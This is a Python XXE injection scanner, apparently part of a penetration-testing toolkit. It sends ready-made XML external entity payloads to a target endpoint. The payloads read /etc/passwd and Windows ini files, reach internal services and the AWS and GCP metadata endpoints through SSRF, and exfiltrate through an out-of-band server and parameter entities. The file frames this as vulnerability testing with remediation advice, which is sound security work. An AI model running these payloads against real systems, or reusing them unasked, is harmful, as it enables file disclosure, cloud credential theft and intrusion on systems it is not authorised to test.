#!/usr/bin/env python3
"""
XML External Entity (XXE) injection testing module.

Usage:
    python xxe_tester.py --target https://example.com/api/parse --output results/
"""

import argparse
import asyncio
import json
import re
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Set

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.http_client import AsyncHTTPClient, HTTPResponse
from core.result_manager import ResultManager, ScanResult, Finding, Severity
from core.utils import setup_logging, load_config, normalize_url, extract_domain, timestamp_now, ensure_dir

logger = setup_logging("xxe_tester")


@dataclass
class XXEVulnerability:
    """Represents a discovered XXE vulnerability."""

    url: str
    xxe_type: str  # file_disclosure, ssrf, blind, error
    payload: str
    evidence: str
    confidence: str = "medium"
    file_disclosed: str = ""
    oob_server: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "xxe_type": self.xxe_type,
            "payload": self.payload,
            "evidence": self.evidence[:500] if self.evidence else "",
            "confidence": self.confidence,
            "file_disclosed": self.file_disclosed,
            "oob_server": self.oob_server,
        }


class XXETester:
    """
    XML External Entity (XXE) vulnerability tester.

    Features:
    - File disclosure detection
    - SSRF via XXE
    - Blind XXE detection (OOB)
    - Error-based XXE
    - Parameter entity injection
    """

    # File disclosure payloads
    FILE_PAYLOADS = [
        # Linux files
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "/etc/passwd", r"root:.*:0:0"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>', "/etc/hosts", r"localhost"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', "/etc/hostname", r"\w+"),

        # Windows files
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', "win.ini", r"\[fonts\]"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><foo>&xxe;</foo>', "system.ini", r"\[drivers\]"),

        # PHP wrapper
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>', "/etc/passwd", r"[A-Za-z0-9+/=]{20,}"),
    ]

    # SSRF payloads
    SSRF_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>',
    ]

    # Blind XXE payloads (need OOB server)
    BLIND_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{oob_url}">%xxe;]><foo>test</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oob_url}">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "{oob_url}"><foo>test</foo>',
    ]

    # Error-based XXE
    ERROR_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistent">%xxe;]><foo>test</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY xxe2 SYSTEM "file://&xxe;">]><foo>&xxe2;</foo>',
    ]

    # Parameter entity payloads
    PARAMETER_ENTITY_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'file:///%file;\'>">%eval;%exfil;]><foo>test</foo>',
    ]

    # Content types that accept XML
    XML_CONTENT_TYPES = [
        "application/xml",
        "text/xml",
        "application/xhtml+xml",
        "application/soap+xml",
        "application/rss+xml",
        "application/atom+xml",
    ]

    def __init__(
        self,
        target: str,
        output_dir: str = "results",
        config: Optional[Dict] = None,
        proxy: Optional[str] = None,
        timeout: int = 30,
        oob_server: Optional[str] = None,
        verbose: bool = False,
    ):
        self.target = normalize_url(target)
        self.target_domain = extract_domain(target)
        self.output_dir = Path(output_dir)
        self.config = config or {}
        self.proxy = proxy
        self.timeout = timeout
        self.oob_server = oob_server
        self.verbose = verbose

        self.vulnerabilities: List[XXEVulnerability] = []
        self.accepts_xml: bool = False

        self.result_manager = ResultManager(output_dir)
        ensure_dir(self.output_dir)

    async def test(self) -> ScanResult:
        """Run XXE tests and return results."""
        result = ScanResult(
            tool="xxe_tester",
            target=self.target,
            config={
                "timeout": self.timeout,
                "oob_server": self.oob_server,
            },
        )

        logger.info(f"Starting XXE testing for: {self.target}")

        try:
            # Check if endpoint accepts XML
            await self._check_xml_acceptance()

            if not self.accepts_xml:
                logger.warning("Endpoint may not accept XML. Testing anyway...")

            # Test file disclosure
            await self._test_file_disclosure()

            # Test SSRF via XXE
            await self._test_ssrf()

            # Test blind XXE if OOB server provided
            if self.oob_server:
                await self._test_blind_xxe()

            # Test error-based XXE
            await self._test_error_based()

            # Calculate statistics
            result.stats = {
                "accepts_xml": self.accepts_xml,
                "vulnerabilities_found": len(self.vulnerabilities),
                "by_type": self._count_by_type(),
            }

            # Add findings
            for vuln in self.vulnerabilities:
                severity = Severity.HIGH
                if vuln.xxe_type == "file_disclosure":
                    severity = Severity.CRITICAL
                elif vuln.xxe_type == "ssrf":
                    severity = Severity.HIGH
                elif vuln.confidence == "low":
                    severity = Severity.MEDIUM

                result.add_finding(Finding(
                    title=f"XXE Injection ({vuln.xxe_type})",
                    severity=severity,
                    description=f"XML External Entity injection allowing {vuln.xxe_type.replace('_', ' ')}",
                    url=vuln.url,
                    payload=vuln.payload,
                    evidence=vuln.evidence,
                    metadata={
                        "xxe_type": vuln.xxe_type,
                        "confidence": vuln.confidence,
                        "file_disclosed": vuln.file_disclosed,
                    },
                    cwe_id="CWE-611",
                    remediation="Disable external entity processing in XML parsers. Use JSON instead of XML where possible.",
                ))

        except Exception as e:
            result.add_error(f"Testing error: {e}")
            logger.error(f"Testing error: {e}")

        result.finalize()
        return result

    async def _check_xml_acceptance(self):
        """Check if endpoint accepts XML content."""
        logger.info("Checking XML acceptance...")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
        ) as client:
            # Test with simple XML
            xml_payload = '<?xml version="1.0"?><root><test>value</test></root>'

            for content_type in self.XML_CONTENT_TYPES:
                try:
                    response = await client.post(
                        self.target,
                        data=xml_payload,
                        headers={"Content-Type": content_type},
                    )

                    # Check if server processed the XML
                    if response.status in [200, 201, 202, 400, 422]:
                        self.accepts_xml = True
                        logger.info(f"Endpoint accepts XML with Content-Type: {content_type}")
                        return

                except Exception as e:
                    logger.debug(f"Error testing content type {content_type}: {e}")

    async def _test_file_disclosure(self):
        """Test for file disclosure via XXE."""
        logger.info("Testing file disclosure XXE...")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for payload, file_path, pattern in self.FILE_PAYLOADS:
                try:
                    response = await client.post(
                        self.target,
                        data=payload,
                        headers={"Content-Type": "application/xml"},
                    )

                    # Check if file content is in response
                    if re.search(pattern, response.body, re.IGNORECASE):
                        vuln = XXEVulnerability(
                            url=self.target,
                            xxe_type="file_disclosure",
                            payload=payload[:200],
                            evidence=response.body[:500],
                            confidence="high",
                            file_disclosed=file_path,
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found file disclosure XXE: {file_path}")

                        if self.verbose:
                            logger.debug(f"Response: {response.body[:200]}")

                        return  # Found, stop testing

                except Exception as e:
                    logger.debug(f"Error testing file payload: {e}")

    async def _test_ssrf(self):
        """Test for SSRF via XXE."""
        logger.info("Testing SSRF via XXE...")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for payload in self.SSRF_PAYLOADS:
                try:
                    response = await client.post(
                        self.target,
                        data=payload,
                        headers={"Content-Type": "application/xml"},
                    )

                    # Check for SSRF indicators
                    ssrf_indicators = [
                        "connection refused",
                        "couldn't connect",
                        "unable to connect",
                        "timed out",
                        "404",
                        "ssh",
                        "ftp",
                        "ami-id",  # AWS metadata
                        "instance-id",
                        "meta-data",
                    ]

                    for indicator in ssrf_indicators:
                        if indicator.lower() in response.body.lower():
                            vuln = XXEVulnerability(
                                url=self.target,
                                xxe_type="ssrf",
                                payload=payload[:200],
                                evidence=f"SSRF indicator found: {indicator}",
                                confidence="medium",
                            )
                            self.vulnerabilities.append(vuln)
                            logger.info(f"Found potential SSRF via XXE")
                            return

                except Exception as e:
                    logger.debug(f"Error testing SSRF payload: {e}")

    async def _test_blind_xxe(self):
        """Test for blind XXE using OOB server."""
        if not self.oob_server:
            return

        logger.info(f"Testing blind XXE with OOB server: {self.oob_server}")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for payload_template in self.BLIND_PAYLOADS:
                payload = payload_template.format(oob_url=self.oob_server)

                try:
                    response = await client.post(
                        self.target,
                        data=payload,
                        headers={"Content-Type": "application/xml"},
                    )

                    # Note: Actual blind XXE confirmation requires checking OOB server logs
                    vuln = XXEVulnerability(
                        url=self.target,
                        xxe_type="blind",
                        payload=payload[:200],
                        evidence="Blind XXE payload sent. Check OOB server for callbacks.",
                        confidence="low",
                        oob_server=self.oob_server,
                    )
                    self.vulnerabilities.append(vuln)
                    logger.info("Blind XXE payload sent - check OOB server")
                    return

                except Exception as e:
                    logger.debug(f"Error testing blind payload: {e}")

    async def _test_error_based(self):
        """Test for error-based XXE."""
        logger.info("Testing error-based XXE...")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for payload in self.ERROR_PAYLOADS:
                try:
                    response = await client.post(
                        self.target,
                        data=payload,
                        headers={"Content-Type": "application/xml"},
                    )

                    # Check for XML parsing errors that leak information
                    error_indicators = [
                        "entity",
                        "dtd",
                        "external",
                        "parser",
                        "xml",
                        "syntax",
                        "file not found",
                        "no such file",
                        "cannot open",
                    ]

                    for indicator in error_indicators:
                        if indicator.lower() in response.body.lower():
                            vuln = XXEVulnerability(
                                url=self.target,
                                xxe_type="error",
                                payload=payload[:200],
                                evidence=f"Error indicator: {indicator}",
                                confidence="low",
                            )
                            self.vulnerabilities.append(vuln)
                            logger.info("Found error-based XXE indicator")
                            return

                except Exception as e:
                    logger.debug(f"Error testing error-based payload: {e}")

    def _count_by_type(self) -> Dict[str, int]:
        """Count vulnerabilities by type."""
        counts: Dict[str, int] = {}
        for vuln in self.vulnerabilities:
            counts[vuln.xxe_type] = counts.get(vuln.xxe_type, 0) + 1
        return counts

    def save_results(self, result: ScanResult) -> Dict[str, str]:
        """Save results to files."""
        paths = self.result_manager.save(result, f"xxe_{self.target_domain}")

        vuln_path = self.output_dir / f"xxe_vulns_{self.target_domain}.json"
        with open(vuln_path, "w") as f:
            json.dump(
                {
                    "target": self.target,
                    "timestamp": timestamp_now(),
                    "vulnerabilities": [v.to_dict() for v in self.vulnerabilities],
                },
                f,
                indent=2,
            )
        paths["vulnerabilities"] = str(vuln_path)

        return paths


async def main():
    parser = argparse.ArgumentParser(
        description="XML External Entity (XXE) vulnerability tester"
    )
    parser.add_argument("-t", "--target", required=True, help="Target URL (XML endpoint)")
    parser.add_argument("-o", "--output", default="results", help="Output directory")
    parser.add_argument("-c", "--config", help="Config file path")
    parser.add_argument("-p", "--proxy", help="Proxy URL")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout")
    parser.add_argument("--oob-server", help="OOB server URL for blind XXE testing")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    config = {}
    if args.config:
        config = load_config(args.config)

    tester = XXETester(
        target=args.target,
        output_dir=args.output,
        config=config,
        proxy=args.proxy,
        timeout=args.timeout,
        oob_server=args.oob_server,
        verbose=args.verbose,
    )

    result = await tester.test()
    paths = tester.save_results(result)

    print(f"\n{'='*60}")
    print(f"XXE Testing Complete: {args.target}")
    print(f"{'='*60}")
    print(f"Vulnerabilities Found: {len(tester.vulnerabilities)}")
    print(f"By Type: {result.stats.get('by_type', {})}")
    print(f"\nResults saved to:")
    for name, path in paths.items():
        print(f"  {name}: {path}")

    if tester.vulnerabilities:
        print(f"\n*** VULNERABILITIES FOUND ***")
        for vuln in tester.vulnerabilities:
            print(f"  [{vuln.confidence.upper()}] {vuln.xxe_type}: {vuln.file_disclosed or 'N/A'}")


if __name__ == "__main__":
    asyncio.run(main())
